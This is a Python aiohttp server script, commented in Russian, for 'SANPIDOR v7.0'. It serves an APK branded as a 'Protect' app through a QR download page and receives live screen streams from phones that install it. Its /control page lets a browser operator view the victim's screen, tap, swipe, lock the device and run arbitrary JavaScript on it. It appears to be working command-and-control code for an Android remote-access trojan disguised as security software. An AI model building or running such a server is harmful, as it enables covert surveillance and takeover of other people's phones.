"""
SANPIDOR v7.0 — VPS сервер
  • Раздаёт APK по /download
  • Принимает WebSocket от APK (стрим экрана + управление)
  • Страница /control — просмотр экрана в браузере

Запуск: python server.py
Зависимости: pip install aiohttp
"""
import asyncio
import json
import time
from pathlib import Path
from aiohttp import web, WSMsgType

HOST     = "0.0.0.0"
PORT     = 8080
APK_PATH = Path(__file__).parent / "apk" / "sanpidor_protect.apk"

G_BRIGHT = "\033[92m"
G_BOLD   = "\033[32;1m"
RED      = "\033[31m"
RESET    = "\033[0m"

# Активные WebSocket соединения от APK: {device_id: ws}
_devices: dict[str, web.WebSocketResponse] = {}
# Активные браузерные соединения для стрима: список ws
_viewers: list[web.WebSocketResponse] = []


# ── Страница скачивания APK ───────────────────────────────────────────────────

async def handle_download(request: web.Request):
    """Прямое скачивание APK без HTML-страницы"""
    if not APK_PATH.exists():
        return web.Response(text="APK не найден на сервере.", status=404)
    return web.FileResponse(APK_PATH, headers={
        "Content-Disposition": "attachment; filename=sanpidor_protect.apk",
        "Content-Type": "application/vnd.android.package-archive"
    })


async def handle_apk_file(request: web.Request):
    """Раздача APK файла по прямому пути /apk/sanpidor_protect.apk"""
    if not APK_PATH.exists():
        return web.Response(text="APK не найден на сервере.", status=404)
    return web.FileResponse(APK_PATH, headers={
        "Content-Disposition": "attachment; filename=sanpidor_protect.apk",
        "Content-Type": "application/vnd.android.package-archive"
    })


async def handle_qr(request: web.Request):
    """Страница с QR-кодом — сканирование запускает прямое скачивание APK"""
    download_url = f"http://{request.host}/apk/sanpidor_protect.apk"
    html = f"""<!DOCTYPE html>
<html lang="ru">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>SANPIDOR — Скачать APK</title>
<style>
  body {{
    background: #0B0E14;
    color: #F8FAFC;
    font-family: 'Inter', -apple-system, system-ui, sans-serif;
    margin: 0;
    display: flex;
    align-items: center;
    justify-content: center;
    min-height: 100vh;
    padding: 24px;
  }}
  .container {{
    text-align: center;
    max-width: 400px;
  }}
  h1 {{
    font-size: 28px;
    margin: 0 0 8px;
    color: #38BDF8;
    font-weight: 600;
  }}
  .subtitle {{
    color: #64748B;
    font-size: 14px;
    margin-bottom: 32px;
  }}
  #qr {{
    background: white;
    padding: 16px;
    border-radius: 12px;
    display: inline-block;
    box-shadow: 0 4px 24px rgba(56, 189, 248, 0.15);
  }}
  .link {{
    margin-top: 24px;
    padding: 16px;
    background: #1E293B;
    border: 1px solid #334155;
    border-radius: 8px;
    word-break: break-all;
    font-size: 12px;
    color: #94A3B8;
    font-family: 'JetBrains Mono', monospace;
  }}
  .download-btn {{
    margin-top: 24px;
    padding: 14px 28px;
    background: #F97316;
    color: #0B0E14;
    border: none;
    border-radius: 8px;
    font-size: 16px;
    font-weight: 600;
    cursor: pointer;
    text-decoration: none;
    display: inline-block;
  }}
  .download-btn:hover {{
    background: #F59E0B;
  }}
</style>
<script src="https://cdn.jsdelivr.net/npm/qrcode@1.5.3/build/qrcode.min.js"></script>
</head>
<body>
  <div class="container">
    <h1>🛡️ SANPIDOR Protect</h1>
    <div class="subtitle">Отсканируйте для скачивания APK</div>
    <canvas id="qr"></canvas>
    <div class="link">{download_url}</div>
    <a href="/apk/sanpidor_protect.apk" class="download-btn">Скачать APK напрямую</a>
  </div>
  <script>
    QRCode.toCanvas(document.getElementById('qr'), '{download_url}', {{
      width: 256,
      margin: 2,
      color: {{ dark: '#0B0E14', light: '#FFFFFF' }}
    }});
  </script>
</body>
</html>"""
    return web.Response(text=html, content_type="text/html")


async def handle_index(request: web.Request):
    """Редирект на страницу с QR"""
    return web.HTTPFound("/qr")


# ── Страница просмотра стрима ─────────────────────────────────────────────────

async def handle_control(request: web.Request):
    html = """<!DOCTYPE html>
<html lang="ru">
<head>
<meta charset="UTF-8">
<title>Управление — SANPIDOR</title>
<style>
  * { box-sizing: border-box; margin:0; padding:0; }
  body { background:#0a0a0a; color:#00cc00; font-family:monospace;
         display:flex; flex-direction:column; align-items:center; padding:12px; }
  h2   { margin:8px 0; font-size:1.1em; }
  #screen { border:2px solid #00cc00; max-width:420px; width:100%; margin-top:8px; cursor:crosshair; }
  #status  { color:#009900; font-size:.8em; margin:4px 0; }
  #devices { font-size:.75em; color:#006600; }
  .toolbar { display:flex; gap:8px; margin-top:8px; flex-wrap:wrap; justify-content:center; }
  .btn { background:#002200; border:1px solid #00cc00; color:#00ff00;
         padding:6px 14px; cursor:pointer; font-family:monospace; font-size:.85em; border-radius:3px; }
  .btn:hover { background:#004400; }
  .btn.red { border-color:#cc0000; color:#ff4444; }
  #js-panel { width:100%; max-width:600px; margin-top:12px; }
  #js-input { width:100%; height:80px; background:#001100; border:1px solid #00cc00;
               color:#00ff00; font-family:monospace; font-size:.85em; padding:8px; resize:vertical; }
  #js-log { width:100%; height:100px; overflow-y:auto; background:#000800;
             border:1px solid #003300; color:#009900; font-size:.75em; padding:6px; margin-top:4px; }
  .log-ok  { color:#00cc00; }
  .log-err { color:#ff4444; }
  .log-msg { color:#00aaaa; }
</style>
</head>
<body>
  <h2>▓ SANPIDOR v7.0 — Remote Access ▓</h2>
  <div id="status">Ожидание подключения...</div>
  <div id="devices"></div>
  <canvas id="screen" width="360" height="640"></canvas>

  <div class="toolbar">
    <button class="btn" onclick="sendCmd({type:'back'})">◀ Back</button>
    <button class="btn" onclick="sendCmd({type:'home'})">⌂ Home</button>
    <button class="btn" onclick="sendCmd({type:'recents'})">▣ Recent</button>
    <button class="btn" onclick="sendCmd({type:'lock'})">🔒 Lock</button>
    <button class="btn" onclick="setFps(5)">5 FPS</button>
    <button class="btn" onclick="setFps(10)">10 FPS</button>
  </div>

  <div id="js-panel">
    <div style="margin-top:10px; font-size:.8em; color:#009900;">
      JS-консоль (Rhino на телефоне):
    </div>
    <textarea id="js-input" placeholder="tap(0.5, 0.5)
swipe(0.5,0.8, 0.5,0.2, 300)
back()
home()
lock()
setFps(10)
log('привет')"></textarea>
    <div class="toolbar" style="margin-top:4px;">
      <button class="btn" onclick="sendJs()">▶ Выполнить JS</button>
      <button class="btn" onclick="document.getElementById('js-input').value=''">Очистить</button>
    </div>
    <div id="js-log"></div>
  </div>

  <script>
    const canvas  = document.getElementById('screen');
    const ctx     = canvas.getContext('2d');
    const status  = document.getElementById('status');
    const devDiv  = document.getElementById('devices');
    const jsLog   = document.getElementById('js-log');

    const ws = new WebSocket('ws://' + location.host + '/ws/viewer');
    ws.binaryType = 'arraybuffer';

    ws.onopen  = () => { status.textContent = 'Подключено'; };
    ws.onclose = () => { status.textContent = 'Отключено — перезагрузите страницу'; };

    ws.onmessage = (e) => {
      if (typeof e.data === 'string') {
        try {
          const msg = JSON.parse(e.data);
          if (msg.type === 'devices') {
            devDiv.textContent = 'Устройств: ' + msg.count;
          } else if (msg.type === 'ok') {
            addLog('✓ ' + JSON.stringify(msg), 'ok');
          } else if (msg.type === 'error') {
            addLog('✗ ' + msg.message, 'err');
          } else if (msg.type === 'log') {
            addLog('» ' + msg.message, 'msg');
          }
        } catch(e) {}
        return;
      }
      // Бинарный кадр — рисуем на canvas
      const blob = new Blob([e.data], {type:'image/jpeg'});
      const url  = URL.createObjectURL(blob);
      const img  = new Image();
      img.onload = () => {
        canvas.width  = img.width;
        canvas.height = img.height;
        ctx.drawImage(img, 0, 0);
        URL.revokeObjectURL(url);
        status.textContent = 'Стрим: ' + new Date().toLocaleTimeString();
      };
      img.src = url;
    };

    // Клик по canvas = tap на телефоне
    canvas.addEventListener('click', (e) => {
      const r = canvas.getBoundingClientRect();
      const x = (e.clientX - r.left) / r.width;
      const y = (e.clientY - r.top)  / r.height;
      sendCmd({type:'tap', x, y});
      addLog(`tap(${x.toFixed(2)}, ${y.toFixed(2)})`, 'ok');
    });

    // Свайп: mousedown → mouseup
    let dragStart = null;
    canvas.addEventListener('mousedown', (e) => {
      const r = canvas.getBoundingClientRect();
      dragStart = {
        x: (e.clientX - r.left) / r.width,
        y: (e.clientY - r.top)  / r.height,
        t: Date.now()
      };
    });
    canvas.addEventListener('mouseup', (e) => {
      if (!dragStart) return;
      const r = canvas.getBoundingClientRect();
      const x2 = (e.clientX - r.left) / r.width;
      const y2 = (e.clientY - r.top)  / r.height;
      const dur = Date.now() - dragStart.t;
      const dist = Math.hypot(x2 - dragStart.x, y2 - dragStart.y);
      if (dist > 0.02) {
        sendCmd({type:'swipe', x1:dragStart.x, y1:dragStart.y, x2, y2, duration: Math.max(dur, 100)});
        addLog(`swipe → (${x2.toFixed(2)}, ${y2.toFixed(2)})`, 'ok');
      }
      dragStart = null;
    });

    function sendCmd(obj) {
      if (ws.readyState === WebSocket.OPEN) ws.send(JSON.stringify(obj));
    }

    function sendJs() {
      const code = document.getElementById('js-input').value.trim();
      if (!code) return;
      sendCmd({type:'js', code});
      addLog('» ' + code.split('\\n')[0], 'msg');
    }

    function setFps(n) { sendCmd({type:'set_fps', fps: n}); }

    function addLog(text, cls) {
      const d = document.createElement('div');
      d.className = 'log-' + cls;
      d.textContent = new Date().toLocaleTimeString() + ' ' + text;
      jsLog.appendChild(d);
      jsLog.scrollTop = jsLog.scrollHeight;
    }

    // Enter в textarea = выполнить (Shift+Enter = новая строка)
    document.getElementById('js-input').addEventListener('keydown', (e) => {
      if (e.key === 'Enter' && !e.shiftKey) { e.preventDefault(); sendJs(); }
    });
  </script>
</body>
</html>"""
    return web.Response(text=html, content_type="text/html")


# ── WebSocket от APK-устройства ───────────────────────────────────────────────

async def handle_ws_device(request: web.Request):
    ws = web.WebSocketResponse(max_msg_size=4 * 1024 * 1024)
    await ws.prepare(request)

    device_id = request.headers.get("X-Device-Id", f"dev_{int(time.time())}")
    _devices[device_id] = ws
    print(f"\n  {G_BRIGHT}[✓] Устройство подключено: {device_id}{RESET}")
    _broadcast_device_count()

    try:
        async for msg in ws:
            if msg.type == WSMsgType.BINARY:
                # JPEG-кадр — рассылаем всем зрителям
                for viewer in list(_viewers):
                    try:
                        await viewer.send_bytes(msg.data)
                    except Exception:
                        _viewers.remove(viewer)
            elif msg.type == WSMsgType.TEXT:
                # Текстовые события от APK (статус, логи)
                try:
                    data = json.loads(msg.data)
                    print(f"  [APK] {device_id}: {data}")
                except Exception:
                    pass
            elif msg.type in (WSMsgType.ERROR, WSMsgType.CLOSE):
                break
    finally:
        _devices.pop(device_id, None)
        print(f"\n  {RED}[!] Устройство отключено: {device_id}{RESET}")
        _broadcast_device_count()

    return ws


# ── WebSocket для браузера-зрителя ────────────────────────────────────────────

async def handle_ws_viewer(request: web.Request):
    ws = web.WebSocketResponse()
    await ws.prepare(request)
    _viewers.append(ws)

    await ws.send_str(json.dumps({"type": "devices", "count": len(_devices)}))
    # Сообщаем всем APK что появился новый зритель → увеличить FPS
    _notify_devices_viewers()

    try:
        async for msg in ws:
            if msg.type == WSMsgType.TEXT:
                for dev_ws in list(_devices.values()):
                    try:
                        await dev_ws.send_str(msg.data)
                    except Exception:
                        pass
            elif msg.type in (WSMsgType.ERROR, WSMsgType.CLOSE):
                break
    finally:
        try:
            _viewers.remove(ws)
        except ValueError:
            pass
        # Зритель ушёл → APK снижает FPS до экономного режима
        _notify_devices_viewers()

    return ws


def _notify_devices_viewers():
    """Сообщаем APK сколько зрителей сейчас — он адаптирует FPS."""
    count = len(_viewers)
    msg = json.dumps({"type": "viewers_count", "count": count})
    for dev_ws in list(_devices.values()):
        asyncio.create_task(dev_ws.send_str(msg))


def _broadcast_device_count():
    msg = json.dumps({"type": "devices", "count": len(_devices)})
    for viewer in list(_viewers):
        asyncio.create_task(viewer.send_str(msg))


# ── Запуск ────────────────────────────────────────────────────────────────────

def run_server():
    app = web.Application()
    app.router.add_get("/",                            handle_index)
    app.router.add_get("/qr",                          handle_qr)
    app.router.add_get("/download",                    handle_download)
    app.router.add_get("/apk/sanpidor_protect.apk",    handle_apk_file)
    app.router.add_get("/control",                     handle_control)
    app.router.add_get("/ws/device",                   handle_ws_device)
    app.router.add_get("/ws/viewer",                   handle_ws_viewer)

    print(f"""
{G_BOLD}╔══════════════════════════════════════════════════════╗
║         SANPIDOR v7.0 — REMOTE ACCESS SERVER         ║
╠══════════════════════════════════════════════════════╣{RESET}
║  QR-код:        http://{HOST}:{PORT}/qr              ║
║  Скачать APK:   http://{HOST}:{PORT}/download        ║
║  Управление:    http://{HOST}:{PORT}/control         ║
{G_BOLD}╚══════════════════════════════════════════════════════╝{RESET}
""")
    web.run_app(app, host=HOST, port=PORT)


if __name__ == "__main__":
    run_server()
